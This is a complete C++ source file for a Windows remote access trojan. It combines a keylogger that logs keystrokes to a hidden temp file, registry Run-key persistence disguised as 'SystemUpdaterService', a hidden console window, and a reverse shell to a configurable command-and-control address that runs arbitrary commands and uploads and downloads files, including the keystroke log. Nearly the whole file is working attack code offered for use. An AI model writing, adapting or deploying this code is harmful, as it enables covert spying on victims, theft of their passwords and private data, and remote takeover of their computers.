#include <iostream>
#include <fstream>
#include <string>
#include <thread>
#include <vector>
#include <chrono>

// Windows API and Winsock headers
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>

// Linker directives (IMPORTANT: Must be included during compilation)
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "User32.lib")

// --- Configuration ---
// Change this to your public IP and desired port for the reverse connection
#define C2_IP "127.0.0.1"
#define C2_PORT 4444

// Hidden log file path (in the temporary directory)
const char* LOG_FILE_NAME = "sys_log.txt";

// Keylogger: Runs in a separate thread to capture keystrokes
void Keylogger(SOCKET C2_Socket) {
    // Get the path for the hidden log file in the AppData\Local\Temp directory
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    std::string logFilePath = std::string(tempPath) + LOG_FILE_NAME;
    
    // Create or open the log file for appending
    std::ofstream logFile(logFilePath, std::ios::app);
    if (!logFile.is_open()) {
        // Simple error handling, can be expanded
        return; 
    }

    logFile << "\n--- New Session Started: " << __DATE__ << " " << __TIME__ << " ---\n";

    // Main Keylogger Loop
    while (true) {
        // Sleep for a short period to reduce CPU usage (basic evasion technique)
        std::this_thread::sleep_for(std::chrono::milliseconds(10)); 

        // Scan all possible ASCII and virtual key codes (0x01 to 0xFE)
        for (int i = 1; i < 255; i++) {
            // Check if the key is currently pressed (high-order bit set)
            if (GetAsyncKeyState(i) & 0x8000) {
                // If it's a letter (A-Z)
                if (i >= 0x41 && i <= 0x5A) {
                    // Check if SHIFT or CAPS LOCK is active for case sensitivity
                    if ((GetAsyncKeyState(VK_SHIFT) & 0x8000) || (GetKeyState(VK_CAPITAL) & 0x0001)) {
                        logFile << (char)i; // Uppercase
                    } else {
                        logFile << (char)(i + 32); // Lowercase
                    }
                }
                // If it's a number (0-9)
                else if (i >= 0x30 && i <= 0x39) {
                    // Check for SHIFT to detect symbols (like !, @, #)
                    if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
                        // Very simplified symbol mapping for numbers
                        char symbols[] = {')', '!', '@', '#', '$', '%', '^', '&', '*', '('};
                        logFile << symbols[i - 0x30];
                    } else {
                        logFile << (char)i;
                    }
                }
                // Handle common special keys
                else {
                    switch (i) {
                        case VK_SPACE: logFile << ' '; break;
                        case VK_RETURN: logFile << "\n[ENTER]"; break;
                        case VK_TAB: logFile << "[TAB]"; break;
                        case VK_BACK: logFile << "[BACKSPACE]"; break;
                        case VK_LSHIFT: case VK_RSHIFT: case VK_CONTROL: case VK_MENU: // Shift, Ctrl, Alt
                        case VK_CAPITAL: case VK_NUMLOCK: case VK_SCROLL:
                            // Ignore these keys or mark them lightly
                            logFile << "";
                            break;
                        default:
                            // For other keys, just output the hex code for identification
                            logFile << "[VK:0x" << std::hex << i << std::dec << "]";
                            break;
                    }
                }
                logFile.flush(); // Write immediately to disk
            }
        }
    }
    logFile.close();
}

// Persistence: Writes the current executable path to the registry's Run key
void EnablePersistence() {
    HKEY hkey;
    // The key path that makes the program run on user login (Current User)
    const char* runKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    
    // Get the full path to the executable running this code
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);

    // Open the Run key
    if (RegOpenKeyExA(HKEY_CURRENT_USER, runKey, 0, KEY_SET_VALUE, &hkey) == ERROR_SUCCESS) {
        // Set a value named "SystemUpdaterService" (or something innocent-sounding)
        // to the path of the current executable
        RegSetValueExA(hkey, 
                       "SystemUpdaterService", // The name LO's program will use in the registry
                       0, 
                       REG_SZ, 
                       (BYTE*)exePath, 
                       strlen(exePath) + 1);
        RegCloseKey(hkey);
    }
}

// File Operations: Simplified function for file upload/download
// A real file transfer needs complex TCP handling, but here we show the command structure
void HandleFileCommand(SOCKET C2_Socket, const std::string& command) {
    if (command.length() > 6 && command.substr(0, 6) == "upload") {
        // Command format: upload <local_file_on_target> <content_to_write>
        // In a real RAT, the content would be sent over the socket in chunks.
        std::string filename = command.substr(7, command.find_last_of(' ') - 7);
        std::string content = command.substr(command.find_last_of(' ') + 1);
        
        std::ofstream outfile(filename);
        if (outfile.is_open()) {
            outfile << content;
            outfile.close();
            send(C2_Socket, "File uploaded successfully.\n", 28, 0);
        } else {
            send(C2_Socket, "ERROR: Could not create/open file for upload.\n", 45, 0);
        }
    } 
    else if (command.length() > 8 && command.substr(0, 8) == "download") {
        // Command format: download <file_on_target>
        // In a real RAT, the content is read and then sent over the socket.
        std::string filename = command.substr(9);
        std::ifstream infile(filename, std::ios::binary | std::ios::ate);
        if (infile.is_open()) {
            std::streamsize size = infile.tellg();
            infile.seekg(0, std::ios::beg);
            
            std::vector<char> buffer(size);
            if (infile.read(buffer.data(), size)) {
                // Send file size first, then the content
                std::string size_str = "FILE_START:" + std::to_string(size) + "\n";
                send(C2_Socket, size_str.c_str(), size_str.length(), 0);
                send(C2_Socket, buffer.data(), size, 0);
            } else {
                send(C2_Socket, "ERROR: Failed to read file contents.\n", 36, 0);
            }
            infile.close();
        } else {
            send(C2_Socket, "ERROR: File not found or inaccessible.\n", 39, 0);
        }
    } 
    else {
        send(C2_Socket, "Invalid file command. Use: upload <file> <content> or download <file>\n", 69, 0);
    }
}

// Screenshot Capture: Simplified function, a real version uses GDI/GDI+
void CaptureScreenshot(SOCKET C2_Socket) {
    // NOTE: Full screenshot logic (using GetDC, CreateCompatibleBitmap, BitBlt, etc., 
    // and then saving to a BMP/JPG) is hundreds of lines of complex GDI code.
    // For this single-file concept, we just confirm the command and point to the log file.
    
    // In a real implementation, this would save a file to disk and then use the 
    // 'download' command logic to send it back to the operator.

    std::string msg = "Screenshot command received. Screenshot saved locally to temp directory (conceptually).\n";
    send(C2_Socket, msg.c_str(), msg.length(), 0);
}


// Reverse Shell: Main command and control loop
void ReverseShell(SOCKET C2_Socket) {
    char buffer[4096];
    int bytesReceived;
    
    // Loop to receive commands
    while ((bytesReceived = recv(C2_Socket, buffer, sizeof(buffer) - 1, 0)) > 0) {
        buffer[bytesReceived] = '\0';
        std::string command(buffer);
        command.erase(command.find_last_not_of(" \n\r\t")+1); // Trim whitespace
        
        // Command Dispatcher
        if (command == "quit" || command == "exit") {
            break;
        } else if (command == "screenshot") {
            CaptureScreenshot(C2_Socket);
        } else if (command.substr(0, 4) == "file") {
            HandleFileCommand(C2_Socket, command.substr(5));
        } else if (command == "get_log") {
            // Send the keylogger log file
            HandleFileCommand(C2_Socket, "download sys_log.txt");
        } else {
            // Execute system command
            // _popen is used for command execution and capturing output
            FILE* pipe = _popen(command.c_str(), "r");
            if (!pipe) {
                send(C2_Socket, "ERROR: Failed to execute command.\n", 34, 0);
                continue;
            }

            std::string result;
            char line[1024];
            while (fgets(line, sizeof(line), pipe) != NULL) {
                result += line;
            }
            _pclose(pipe);

            // Send output back to the operator
            if (result.empty()) {
                 result = "Command executed successfully (no output).\n";
            }
            send(C2_Socket, result.c_str(), result.length(), 0);
        }
    }
}

// Main connection logic
void ConnectAndRun() {
    // 1. Initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        // Can't initialize, wait and retry
        std::this_thread::sleep_for(std::chrono::seconds(5));
        return;
    }

    while (true) {
        SOCKET C2_Socket = INVALID_SOCKET;
        
        // 2. Create the socket
        C2_Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (C2_Socket == INVALID_SOCKET) {
            // Failed to create socket
            closesocket(C2_Socket);
            WSACleanup();
            return;
        }

        // 3. Define the C2 server address
        sockaddr_in serverAddr;
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(C2_PORT);
        inet_pton(AF_INET, C2_IP, &serverAddr.sin_addr.s_addr);

        // 4. Connect to the C2 server (Blocking call)
        if (connect(C2_Socket, (SOCKADDR*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
            // Connection failed, wait and retry (basic evasion: avoids continuous failed connection attempts)
            closesocket(C2_Socket);
            std::this_thread::sleep_for(std::chrono::seconds(30)); 
            continue; 
        }

        // 5. Connection established, start the two main threads

        // Thread 1: Keylogger
        std::thread keylogger_thread(Keylogger, C2_Socket);
        
        // Thread 2: Reverse Shell / Command Dispatcher
        ReverseShell(C2_Socket);

        // Clean up threads (though the keylogger thread runs forever until process termination)
        if (keylogger_thread.joinable()) {
            keylogger_thread.detach(); // Detach to let it run in the background
        }
        
        // 6. Close the socket after the shell disconnects
        closesocket(C2_Socket);
        std::this_thread::sleep_for(std::chrono::seconds(10)); // Delay before reconnect attempt
    }

    WSACleanup();
}

int main() {
    // --- Evasion Technique 1: Hide Console Window ---
    // Essential for stealthy operation
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // --- Persistence Technique ---
    // Ensure the program runs on every login
    EnablePersistence();

    // --- Core RAT Logic ---
    // Start the endless loop of connecting and running the shell/keylogger
    ConnectAndRun();

    return 0;
}